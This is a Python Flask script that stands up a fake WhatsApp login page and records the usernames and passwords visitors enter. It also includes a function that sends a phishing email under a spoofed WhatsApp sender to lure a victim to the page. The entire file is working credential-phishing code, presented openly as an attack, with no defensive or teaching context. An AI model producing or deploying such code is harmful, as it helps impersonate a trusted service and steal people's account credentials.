import smtplib
from email.mime.text import MIMEText
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Create a fake WhatsApp login page
fake_login_page = """
<html>
<body>
    <h1>WhatsApp Login</h1>
    <form action="/login" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

# Store the captured credentials
captured_credentials = []

@app.route('/')
def index():
    return render_template_string(fake_login_page)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    captured_credentials.append((username, password))
    return "Login successful!"

# Send a phishing email to the victim
def send_phishing_email(victim_email):
    msg = MIMEText(f"Please login to WhatsApp using the following link: http://localhost:5000")
    msg['Subject'] = 'WhatsApp Login'
    msg['From'] = 'whatsapp@example.com'
    msg['To'] = victim_email

    with smtplib.SMTP('smtp.example.com') as server:
        server.sendmail('whatsapp@example.com', [victim_email], msg.as_string())

# Example usage
if __name__ == '__main__':
    app.run(debug=True)
    send_phishing_email('victim@example.com')